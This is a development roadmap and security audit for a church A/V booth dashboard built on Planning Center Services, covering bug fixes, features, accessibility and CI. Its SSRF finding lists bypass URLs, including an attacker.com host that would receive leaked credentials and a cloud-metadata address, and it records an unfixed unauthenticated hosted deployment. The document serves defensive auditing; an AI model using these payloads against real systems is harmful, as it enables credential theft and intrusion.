# PCO Service Dashboard — Feature & Improvement Roadmap

## Context

The app is a TV-ready Planning Center Services display for a church A/V booth: song cards
with leader photos in the middle, a camera/director dock along the bottom, service-time
countdown pills in the header. It ships two ways — an Electron desktop app (the preferred
path, distributed as unsigned installers via GitHub Releases) and a Render-hosted web app.

The last ~6 weeks of work (PRs #2–#6, all merged) went **entirely into visual/responsive
layout**. There are zero open issues, zero open PRs, no `TODO`s in code, and no roadmap
document. Meanwhile the app calls **six** PCO endpoints and discards a meaningful share of
what those endpoints already return.

Three things shaped this roadmap:

1. **The product is a well-built renderer sitting on a deliberately thin slice of PCO.** Most
   high-value features need little or no new UI invention — the data is already in the payload
   or one endpoint away.
2. **Several things are built but not connected.** A finished Speaker pill that's passed
   `null`. A parsed song key that's never rendered. A settings field ("Highlighted Member
   Keywords") whose only consumer is a function nobody calls. These are the cheapest wins in
   the repo.
3. **There is no automated verification of any kind.** No tests, no lint, no typecheck, and CI
   runs only on `v*` tags. A PR can merge to `main` — which Render auto-deploys — with nothing
   checked. That makes every item below riskier than it needs to be.

This is a menu, not a single change, ordered by value-per-effort.

---

## Status

**Tier 0 is done.** Tiers 1–4 are open, minus the pieces listed under "Shipped since" below.

### Shipped since: camera shots + cheap wins

The app's biggest gap wasn't in this document at all — it already knew the songs and it already
knew the cameras, and had never connected the two. Per-song, per-camera **shot assignments** now
exist, stored as Planning Center item notes so the plan is visible to the whole team rather than
trapped on one device. See "Camera shots" in `CLAUDE.md`.

That shipped alongside five additions that each read a field already arriving in `/api/plan`:

| Item | Effect |
|---|---|
| 1.6 (part) | Song key, arrangement BPM, and section structure on the card; every `Arrangement` object was previously discarded |
| 1.6 (part) | "Last done 6 weeks ago" from `Song.last_scheduled_at` |
| 1.4 (part) | Dock shows five states, not three: confirmed / unconfirmed / **notified but never opened** / declined-with-reason / empty |
| new | **"N scheduled people aren't shown"** — members matching no position pattern used to vanish silently |
| new | Named service times (`plan_times.name`), and the live window now uses real `ends_at` instead of a flat hour |

Still open in those items: `needed_positions` for a true unfilled state (1.4), rehearsal times
and third-plus service times (1.6).

One Tier 0 item was deliberately left open: **hosted-mode authentication (0.2)**. The Render
deployment's settings routes remain unauthenticated; only the SSRF half of the photo-proxy
problem was fixed. The roster-PII and credential-overwrite exposure on a public Render URL
still stands — worth revisiting if that URL is ever shared beyond the team.

Shipped in Tier 0:

| # | Change | Files |
|---|---|---|
| 1 | Photo-proxy: parse URL, hostname allowlist, `https:` only, auth header only for PCO-owned hosts, redirect target re-validated, image-only `Content-Type` + `nosniff` | `app-server.js` |
| 2 | Deleted the dead `directorKeywords` setting and `sortVideoTeam`/`camNum` | `matching.js`, `buildDashboardData.js`, `app-server.js`, `useSettingsDraft.js`, `SettingsFields.jsx` |
| 3 | Race guard in `selectPlan`; try/catch in `applyNewSettings`; `ErrorBoundary` at the root and around the dashboard | `src/App.jsx`, `src/main.jsx`, `src/components/ErrorBoundary.jsx` |
| 4 | Regex safety: pattern-length and position-count caps, nested-quantifier rejection, `*` escaped in `patternFromLabel`, bounded input and a compile guard client-side | `app-server.js`, `src/lib/positions.js`, `src/lib/buildDashboardData.js` |
| 5 | Atomic settings write (temp + rename) and corrupt-file preservation with a one-time loud warning | `app-server.js` |
| 6 | `pcoAll()` for items / plan_times / service_types, page-count guard, `encodeURIComponent` on path ids, 15s request timeout | `app-server.js` |
| 7 | Doc/config drift: `publicDir` intent, `SETUP.txt` Render build command, untracked `.claude/`, JSX attribute spacing | various |

`directorKeywords` was **deleted** rather than wired up: its only consumer (`sortVideoTeam`)
sorted video members director-first / PTZ-last / by camera number — ordering the explicit
`videoPositions` array and its per-position `isDir` checkbox already supersede.
`normalizeSettings` spreads defaults first and only picks known keys, so existing
`settings.json` files drop the stale key with no migration.

Tier 0 deliberately did **not** touch the `lg` layout contract, `src/ui/` primitives, or
`theme.css` — `CLAUDE.md` documents the mobile card geometry as a fragile equilibrium.

---

## Tier 0 — Defects to fix regardless of what else gets built ✅ done (except 0.2)

Small, mostly localized, and two are genuine security problems on the hosted path.

### 0.1 Photo-proxy SSRF that leaks PCO credentials — `app-server.js:353-375`

```js
const allowed = ['planningcenteronline.com', 'pcoassets.com', 'people.planningcenter', 'cloudfront.net'];
if (!allowed.some(domain => String(url).includes(domain))) return res.status(403).send('Forbidden');
...
const auth = buildAuthHeader(runtime.creds);
const response = await fetch(url, auth ? { headers: { 'Authorization': auth } } : undefined);
```

The allowlist is a **substring test against the whole URL string**, not the parsed hostname,
and the org's PCO Basic auth header is then attached to whatever host is fetched. All of these
pass:

- `http://attacker.com/?planningcenteronline.com` → exfiltrates base64 `appId:secret`
- `http://169.254.169.254/latest/meta-data/?x=pcoassets.com` → cloud metadata
- `http://127.0.0.1:9200/planningcenteronline.com` → internal services
- `http://planningcenteronline.com.evil.com/`

`cloudfront.net` in the list also means *anyone's* CloudFront distribution.

**Fix:** parse with `new URL(url)`, require `https:`, match `url.hostname` against an
exact/suffix allowlist, and only attach the auth header for PCO-owned hosts. Line 367 also
echoes the upstream `Content-Type` unvalidated — force an image allowlist and add
`X-Content-Type-Options: nosniff`, or the SSRF doubles as same-origin HTML injection.

### 0.2 Hosted mode has no authentication — `server.js:5`, `app-server.js:277`/`298` — ⏭️ STILL OPEN

`server.js` binds `0.0.0.0` and every route is unauthenticated. On a public Render URL (or any
LAN), anyone who can reach it can `GET /api/plan` to read the full volunteer roster (names,
photos, positions, decline status — PII), `POST /api/settings` to overwrite the PCO
credentials, `POST /api/settings/reset` to wipe config, and use
`POST /api/settings/test-credentials` as an unthrottled credential-testing oracle against PCO.

**Fix:** gate the mutating settings routes behind a token when a new `DASHBOARD_ADMIN_TOKEN`
env var is set, keeping Electron (loopback, ephemeral port) exempt. Deliberately deferred —
recorded here so the exposure stays visible.

### 0.3 A settings field that does nothing

`directorKeywords` ("Highlighted Member Keywords" in the settings UI,
`SettingsFields.jsx:213-220`) is collected, validated, persisted, and read back — but its
**only** consumer is `sortVideoTeam` (`matching.js:66`), which is exported, re-exported
(`buildDashboardData.js:124`), and **never called**. Highlighting is driven entirely by the
per-position `isDir` checkbox.

**Fix:** either delete the field and the dead `sortVideoTeam`/`camNum` functions, or wire it
back up. Right now the settings panel lies to the user.

### 0.4 Two ways to get permanently stuck

- **Plan-switch race** — `selectPlan` (`App.jsx:95-109`) awaits `getPlan` then applies
  unconditionally. Switching plans A→B in the header select can land A's slower response after
  B's, rendering A's songs while the picker shows B. The *poller* already does this correctly
  (`App.jsx:55`); the primary path doesn't.
- **Permanent spinner** — `applyNewSettings` (`App.jsx:152-163`) sets `status: 'loading'`,
  nulls `dashboard`, then `await loadPlans(settings)` with **no try/catch**. `boot()` wraps the
  same call (75–79); this path doesn't, and neither caller catches. Save a service type that
  500s → unhandled rejection, permanent "Loading service…", no error state, no retry button.

Also: there is **no `ErrorBoundary` anywhere**, so any render throw is a white screen on the
wall.

### 0.5 Persisted regex patterns can permanently freeze the display

`sanitizeVideoPositions` (`app-server.js:88-92`) only checks that a pattern *compiles*.
`buildPositions` (`buildDashboardData.js:100-101`) then runs it client-side against every video
team member on every render. A catastrophic-backtracking pattern like `(a+)+$` compiles fine,
is persisted to `settings.json`, and hard-freezes the wall display across reloads.

Related: `patternFromLabel` (`positions.js:23-35`) **doesn't escape `*`**, so a label
containing `*` generates an invalid pattern and the save fails with an "invalid regex" error
the user can't act on — they typed a label, not a regex.

**Fix:** cap pattern length and `videoPositions` array length, escape `*`, and truncate
`team_position_name` before testing.

### 0.6 Settings can silently reset to defaults

`saveSettings` (`app-server.js:148-155`) uses a non-atomic `writeFileSync`; `loadSettings`
(`139-146`) swallows every parse error and returns `cloneDefaults()` with no log and no backup.
A crash mid-write silently reverts the booth's entire configuration.

**Fix:** write to a temp file then `fs.renameSync`; on parse failure log loudly, preserve the
bad file as `settings.json.corrupt`, and surface a warning in the settings UI.

### 0.7 Silent data truncation

`app-server.js:339` fetches plan items with plain `pco()` and `per_page=100`, while only
`team_members` (line 340) uses `pcoAll()`. A plan with >100 items silently loses items. Same
for `plan_times` (line 341, no `per_page` at all) and `/api/service-types` (line 311). The
`while (url)` pagination loop (line 207) also has no page-count guard.

### 0.8 Dead code and doc drift

- `speakerName={null}` hardcoded at `App.jsx:190`, but `Header.jsx:136-143` contains a
  complete, styled Speaker pill that never renders (see 1.7).
- `keyName` is parsed (`buildDashboardData.js:50`) and passed as a prop (`:83`) but `SongCard`
  never reads it (see 1.6).
- `serviceTitle` / `serviceDate` are computed (`buildDashboardData.js:15-16`) and never rendered.
- `orgSub` disappears whenever `plans.length > 1` — the plan picker and the sub-label share one
  slot (`Header.jsx:68-86`). Almost certainly unintended.
- `.glass-pill` (`theme.css`) is defined and unused.
- Four copies of the default settings: `app-server.js:11`, `src/lib/positions.js:1`,
  `useSettingsDraft.js:5-26`, and inline `||` defaults at `App.jsx:185-188`.
- `vite.config.js` declares `publicDir: 'static-assets'` — that directory does not exist.
- `SETUP.txt` says Render's build command is `npm install`; per `CLAUDE.md` it **must** include
  `npm run build`, or Render serves an empty `public/`.
- `.claude/settings.local.json` and `.claude/launch.json` are tracked in git despite
  `.gitignore` listing `.claude/` — they leak the maintainer's local absolute paths. Needs
  `git rm --cached`.
- Missing spaces in JSX attributes (`variant="primary"onClick=`) at `SetupWizard.jsx:71,82,83,94,105,106,123,124`
  and `SettingsModal.jsx:78,103,105,106` — harmless, but proof no formatter runs.

---

## Tier 1 — Features (highest product value)

### 1.1 ⭐ Use PCO Services **LIVE** instead of guessing — the headline gap

Today the app *simulates* live state: `LIVE_WINDOW_MS = 60 * 60 * 1000`
(`buildDashboardData.js:4`) declares a service "live" for a flat 60 minutes after its start
time, and change detection works by **diffing song titles between polls** (`App.jsx:120-124`).
A 75-minute service silently drops out of LIVE — and stops polling — 15 minutes before it ends.

PCO exposes `GET /services/v2/service_types/{st}/plans/{id}/live`, which reports **exactly
which item is on right now**, plus current/next item times and the controller.

For a booth wall display, "which song is on *right now*" is the single most valuable thing on
screen, and PCO hands it over directly:

- Highlight the current song card (`.glass-card.is-changed` already establishes the visual
  vocabulary for an emphasized card).
- Auto-scroll the current item into view below `lg`.
- Show "next up" and time-in-item.
- Replace the wall-clock LIVE pill with the real live state.

New backend route `GET /api/live?serviceTypeId&planId`; degrade gracefully when the plan isn't
being controlled (which is most of the week).

### 1.2 Show the whole run of show, not only songs

`buildDashboardData.js:38` filters `item_type === 'song'`. Announcements, welcome, the message,
video roll-ins, and `item_type: 'header'` section breaks — i.e. **the actual service order** —
never reach the screen. Item `length` (per-item duration, already in the payload) is unused, so
there's no running timeline.

Suggest a settings toggle: **Songs only** (today) vs **Full run of show** with durations and a
cumulative timeline; header items become section dividers.

⚠️ This collides with the tuned mobile card geometry documented in `CLAUDE.md` (uniform card
heights depend on four interlocking mechanisms). Non-song items likely want their own shorter
card variant rather than reusing `SongCard`.

### 1.3 Replace `localStorage` notes with real PCO notes

Notes today are `localStorage.setItem('pco_note_{planId}_{itemId}', …)`
(`buildDashboardData.js:51-52`, `App.jsx:209`). Consequences: the booth TV and the director's
phone show **different notes**, nobody in PCO can see them, they vanish on cache clear, and
old plans' keys are never cleaned up. `localStorage` is also read **inside the pure transform**
(`buildDashboardData.js:52`), which is what makes that module untestable in Node.

PCO already has `…/plans/{id}/items/{id}/item_notes` with note **categories** — most teams
already have a "Video" or "Production" category they're filling in. Even read-only is a large
win: the note the director typed in PCO on Thursday shows up on the booth TV on Sunday, with no
double entry.

### 1.4 Distinguish unconfirmed from confirmed volunteers

`buildDashboardData.js:102` collapses status to `m.attributes.status !== 'D'`. PCO returns `C`
(confirmed), `U` (unconfirmed), and `D` (declined) — so **an unconfirmed volunteer currently
renders identically to a confirmed one**. The booth TV shows a smiling face for someone who
never replied.

`CameraSlot.jsx` already has three visual states (filled / empty dashed / declined red ring);
add a fourth amber "unconfirmed" state. Also surface `…/plans/{id}/needed_positions` so "nobody
scheduled" is distinguishable from "my regex matched nothing" — currently both render as the
same empty dashed circle.

### 1.5 Configure teams and positions from real PCO data, not typed substrings

Today you type a lowercase team-name **substring** (`videoTeamName: 'video production'`) and
hand-author a **regex per camera**. `CLAUDE.md` already names this as the top failure mode:
*"if team-matching breaks, check that saved values match actual PCO team/position names."*
Matching is `includes()`-based, so `videoTeamName: "video"` also matches "Video Announcements".

`GET /services/v2/teams` and `…/team_positions` would let the setup wizard and settings modal
offer **real dropdowns of the org's actual team and position names**, with the regex generated
or replaced by exact IDs.

**Pair this with a matching preview.** `PositionsEditor` never shows the generated pattern, so
when matching fails there is no diagnostic at all. A panel showing which PCO positions and
people each pattern resolves to against the current plan turns the app's most common failure
mode from invisible into self-service. Same for `matchLeaders`, whose four OR'd conditions
(`matching.js:55`) mean leader `"Ann"` matches band member `"Joanna"` and `"Christian"` matches
`"Chris Doe"` — with `.find()`, so ties resolve by arbitrary API order, silently.

### 1.6 Surface data already fetched and thrown away

`app-server.js:339` requests `include=song,arrangement`, but `buildSongs` builds its map from
`included` type `'Song'` only (`buildDashboardData.js:31`) — **every `Arrangement` object
arrives over the wire and is silently discarded.** Arrangements carry `name` ("Sunday 2026" /
"Acoustic"), `bpm`, `length`, `meter`, and `chord_chart_key`. Zero additional API cost.

Also discarded:
- **The song key.** `keyName` is built and prop-threaded but never rendered — arguably the most
  operationally useful field on a song card.
- **Rehearsal times, and any service beyond the second.** `buildDashboardData.js:19-21` filters
  `time_type === 'service'` then `.slice(0, 2)`. A booth arguably wants "Rehearsal 8:30 AM"
  more than anything else in the header.
- Plan attributes `series_title`, `length`, `items_count`; and the computed-but-unrendered
  `serviceTitle` / `serviceDate`.

### 1.7 Wire up the Speaker pill

`Header.jsx:136-143` has a finished Speaker pill; `App.jsx:190` passes `speakerName={null}`.
Source it from a configurable team position ("Speaker" / "Preacher" / "Host") the same way
`videoPositions` works, or from a plan item.

### 1.8 Poll always, not only while live — `App.jsx:47-48`

```js
if (!(anyLive || TEST_MODE) || !cfg?.pollIntervalMs) return;
```

A plan edited Saturday night doesn't reach the booth TV until someone taps refresh or the
service clock starts. For a display that sits powered on all week, that's backwards.

Suggest a slow background poll (5–15 min) when idle, escalating to `pollIntervalMs` when live.
PCO also offers `plan.updated` **webhooks**, which would remove polling entirely for the hosted
deployment.

### 1.9 Better change detection

`App.jsx:123` compares only `titleMain`. Key changes, leader swaps, arrangement/description
edits, and reordering are all missed; newly *added* songs are explicitly skipped by the
`oldTitle !== undefined` guard; and `changedSongIds` never clears when the service ends.

### 1.10 Band roster dock, and past plans

- The band/vocal roster is already fetched but used **only** to resolve leader photos. A
  toggleable second dock mirroring the camera dock is nearly free.
- `app-server.js:323` hardcodes `filter=future&per_page=8` — there's no way to look back at
  last Sunday.

---

## Tier 2 — Make it survive a Sunday morning

These matter specifically because this thing runs unattended on a wall.

### 2.1 ⭐ Never blank the screen, and never hide a failure

Two halves of the same gap:

- **Poll failures are invisible.** `App.jsx:57-59` does `console.warn('[poll]', e.message)`. On
  a wall TV nobody sees the console — the dashboard silently serves stale data with no
  indication. There is no "last updated" timestamp anywhere in the header.
- **Any fetch failure blanks the display.** `App.jsx:203` routes to a full-screen `ErrorState`,
  so one transient PCO blip mid-service wipes the booth display — and it renders the raw server
  message, which for PCO failures is `PCO ${status}: ${full response body}` (`app-server.js:196`),
  potentially a giant JSON blob on the TV.

**Fix:** keep the last good dashboard rendered, show a small "reconnecting… last updated 2m ago"
banner, retry with backoff, and persist the last good plan to `localStorage` so a cold start
with no network still shows something. Add `navigator.onLine` / `online` listeners for
auto-recovery.

### 2.2 Kiosk / wall-display mode (Electron)

`electron-main.js` opens a plain 1560×960 window. Each of these is a handful of lines:

- **`powerSaveBlocker`** to stop the display sleeping mid-service — arguably the single most
  important desktop fix.
- Fullscreen / kiosk and always-on-top toggles.
- Remember window bounds and monitor across restarts.
- Launch at login (`app.setLoginItemSettings`).
- Auto-reload on crash.

Hardening while in there: no `sandbox: true`, no `will-navigate` guard (the main window can be
navigated away from the app entirely), and `shell.openExternal(url)` (line 39) is called on an
unvalidated URL.

### 2.3 Auto-update, and signing

There is no `electron-updater`, no `autoUpdater` code, and no `publish` block. The app ships
**unsigned** installers to non-technical volunteers via GitHub Releases with no update path —
every fix requires manually re-downloading a DMG/EXE. Note the release workflow deliberately
withholds the `.yml`/`.blockmap` metadata auto-update needs
(`.github/workflows/release-desktop.yml:95`), so enabling this is a workflow change too.
macOS has no `hardenedRuntime`/notarization and Windows has `signAndEditExecutable: false`, so
both installers trip Gatekeeper/SmartScreen.

### 2.4 Backend hardening

`app-server.js` has **no caching, no rate limiting, no request timeouts, and no 429 backoff** —
on a service whose entire job is proxying a third-party API on a 30-second poll.

- In-memory TTL cache for `/api/plan` (even 10s collapses N dashboards into one PCO call).
- `AbortSignal.timeout()` on both `fetch` sites (lines 191, 364) — `node-fetch` v2 has no
  default timeout, so a hung PCO connection pins a handler forever. Same gap client-side in
  `src/api/client.js`, which has no timeout, no retry, and no cancellation.
- Map PCO status codes through instead of collapsing everything to HTTP 500 (lines 314, 327,
  349) — a bad-credentials 401 and a rate-limit 429 are currently indistinguishable to the
  client, which is why the error screen is never actionable. Stop returning raw PCO bodies.
- `SIGTERM`/`SIGINT` handler in `server.js` (Render sends SIGTERM on every deploy) and a
  `/healthz` endpoint.
- `encodeURIComponent` on `serviceTypeId`/`planId` before interpolating into PCO URLs
  (`app-server.js:320,333`; `client.js:28-30`).

### 2.5 Stop burning CPU on a 24/7 display

- **The whole tree re-renders once per second.** `setNow` (`App.jsx:37`) invalidates `App`,
  which reallocates `headerServiceTimes` (135) and `songsWithChangeFlags` (147) and re-renders
  `Header`, every `SongCard`, and all 13 `CameraSlot`s — ~86,400 times/day. There is **zero
  memoization in the codebase** (no `React.memo`, `useMemo`, or `useCallback` anywhere).
  `fmtCountdown` only changes per-second under a minute; above that it's pure waste. Moving the
  ticker into a memoized `<ServiceTimes>` that owns it eliminates ~98% of renders.
- **`ParticleBackground`** runs 90 particles at 60fps forever with no `prefers-reduced-motion`
  check, no DPR scaling (blurry on 4K), and no low-power opt-out.
- **`backdrop-filter: blur(24px) saturate(180%)`** on four glass surfaces repaints whenever
  anything above it changes — combined with the 1s full re-render, likely the real frame-cost
  hotspot on a TV stick.
- **Google Fonts is a render-blocking external dependency** (`index.html:7-12`, 5 Inter
  weights). For an Electron app and a wall display that may be offline, self-hosting Inter is
  the single largest real-world load-time win.
- `localStorage.setItem` fires on every keystroke in the note field (`App.jsx:209`).

---

## Tier 3 — Accessibility & the component library

`src/ui/` is 6 primitives; every app-specific composite lives outside it. Three additions fix
most of the accessibility findings at once.

### 3.1 A real `Modal` primitive

`Overlay.tsx` is 26 lines and provides **zero dialog semantics**: no `role="dialog"`, no
`aria-modal`, no focus trap (Tab walks straight out into the dashboard behind it), no focus
restore, no initial focus, no `Escape` to close, no background `inert`, no scroll lock, no
portal. Both `SettingsModal` and `SetupWizard` sit on it. `SettingsModal`'s `×` button
(`:64-66`) also has no accessible name.

### 3.2 Label association — the highest-impact form defect

`Field.tsx:22` renders `<label>` with **no `htmlFor`**, and no control in the app has an `id`.
Every field in Settings and the Wizard is an orphaned label: clicking it does nothing, screen
readers don't announce it. `PositionsEditor` inputs have only a `placeholder` — no label at
all — and its Delete buttons all announce as bare "Delete" with no positional context.

### 3.3 A `useReducedMotion` hook

No `@media (prefers-reduced-motion: reduce)` block exists anywhere. Three animations run
regardless: `card-slide-in` and `pulse-live` are applied as **inline styles**
(`SongCard.jsx:81`, `Header.jsx:122`), so a CSS media query alone can't stop them — they need
to move to classes or be read from JS.

### 3.4 The rest

- **No focus ring anywhere.** `controlClass` (`Field.tsx:16`) is `outline-none` + a ~1px
  border-color change; the header icon buttons (`Header.jsx:20`) and `Button.tsx` have no focus
  style at all.
- **No live regions.** Nothing is announced — not LIVE, not a song change, not loading, not
  errors. `LoadingState` needs `role="status" aria-live="polite"`; `ErrorState` needs
  `role="alert"`.
- **No `<main>` landmark**; the song list and camera dock are anonymous divs, not lists.
- `--dim` (`rgba(238,236,248,0.32)` on `#0a0a11`) is ~3:1 and used for 12–13px text — fails
  WCAG AA.
- `SongCard`'s root div is clickable (`:84`) but has no `role`, `tabIndex`, or key handler.
- **Missing primitives** worth extracting: `Toast` (the direct reason 2.1 is invisible),
  `ConfirmDialog` (`SettingsModal:45` uses `window.confirm` — a jarring native dialog on a
  kiosk), `Skeleton`, `IconButton`, `Input`/`Select`, `AvatarGroup` (overlapping avatars are
  implemented two different ways: `marginLeft: -14` in `SongCard:123`, `-space-x-3` in
  `CameraSlot:23`), `EmptyState`, and a shared icon module.
- **Design tokens missing**: no spacing, radius, type, z-index, shadow, or motion scales — every
  font size in the app is an ad-hoc arbitrary value (`text-[13px]` … `text-[36px]`).
- The camera dock has **no overflow handling**: 13 positions × 52px in one `lg:flex-nowrap` row
  overflows into `overflow-x-auto` — silent horizontal scroll on a TV nobody can scroll.

---

## Tier 4 — Quality infrastructure (the multiplier)

The cheapest tier, because the codebase is already shaped for it and nobody took the last step.

### 4.1 Tests — the code is already designed for them

- `src/lib/` is pure and dependency-free (once the `localStorage` read at
  `buildDashboardData.js:52` moves out). `parseLeaderNames`, `parseDescriptionBubbles`,
  `matchLeaders`, `patternFromLabel`, and `fmtCountdown` are trivially testable — and the first
  three are **text-scraping heuristics sitting where a structured field should be**, precisely
  the code most likely to break silently on a description format the author didn't anticipate
  (`"Worship Lead – Bekah"`, `"Led by Bekah"`, `"Bekah and Sam"` all fail today).
- `app-server.js` already exports `createServer()` with an injectable `settingsPath`/`env` and
  `start({ port: 0 })`. That is a supertest-ready design with no tests attached.

Vitest + supertest, starting with `src/lib/` and the settings round-trip.

### 4.2 CI that runs on pull requests

`.github/workflows/release-desktop.yml` is the **only** workflow, triggering on `v*` tags and
`workflow_dispatch` only. Nothing runs on `push` to `main` or on `pull_request` — and Render
deploys from `main`. Add `ci.yml`: `npm ci`, `npm run build`, `npm run build:lib`, typecheck,
lint, test.

### 4.3 Typecheck and lint actually run somewhere

`tsconfig.json` sets `strict: true` but `checkJs: false`, so **every `.jsx`/`.js` file in `src/`
is unchecked**, and `tsc` is never invoked by any script or workflow. `app-server.js`,
`server.js`, and `electron-main.js` are outside `include: ["src"]` entirely. There is no ESLint
or Prettier config at all.

### 4.4 Single source of truth for defaults

Collapse the four copies of the default settings (0.8) into one shared module, and add a
`schemaVersion` field so future renames have a migration path.

---

## Suggested order from here

1. **4.1 + 4.2 + 4.3** — Vitest over `src/lib/`, a `ci.yml` that runs on PRs, a `typecheck`
   script. Makes every subsequent change verifiable before Render auto-deploys it.
2. **1.1 (PCO LIVE)** — biggest single product win, and it replaces two homegrown
   approximations (`LIVE_WINDOW_MS`, title-diffing) with real data.
3. **2.1 + 2.2** — never blank the screen mid-service, and stop the TV going to sleep. What a
   booth would actually notice on a Sunday.

---

## Verifying changes to this app

- `npm run build` must succeed — `public/` is a gitignored build artifact, so nothing serves
  current code until it runs. Then `npm start` and open `http://127.0.0.1:3000`.
- **Both run paths matter**: `npm start` (web/Render) and `npm run electron` (desktop).
  `CLAUDE.md` explicitly constrains changes from breaking the Render-hosted path.
- `npm run build:lib` must still succeed if anything in `src/ui/` is touched.
- Layout changes: check both sides of the `lg` (1024px) breakpoint. `CLAUDE.md` documents it as
  a hard layout contract, and the mobile card-height guarantee depends on four interlocking
  mechanisms.
- `?test` in the URL forces change detection outside service hours — useful for exercising the
  poll path without waiting for Sunday.
- The photo proxy should reject anything whose *parsed hostname* is off the allowlist:
  `curl -i 'http://127.0.0.1:3000/api/photo-proxy?url=http://example.com/?planningcenteronline.com'`
  must return 403 `Forbidden`.
